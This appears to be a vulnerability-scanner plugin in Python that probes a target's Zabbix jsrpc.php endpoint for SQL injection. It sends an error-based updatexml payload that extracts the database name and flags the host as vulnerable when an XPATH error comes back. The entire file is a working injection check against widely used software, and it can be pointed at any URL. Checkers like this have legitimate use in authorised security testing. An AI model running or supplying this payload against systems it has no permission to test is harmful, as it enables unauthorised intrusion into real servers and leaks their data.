#-*-coding:utf-8-*-
import requests
import txconfig

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param['url']
    except Exception as e:
        result['result'] = e
        return result
    payload = '/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,database()),0)'
    url = url + payload
    Re = requests.get(url,headers=headers)
    if "XPATH" in Re.text:
        result['success'] = True
        return result
    else:
        return result
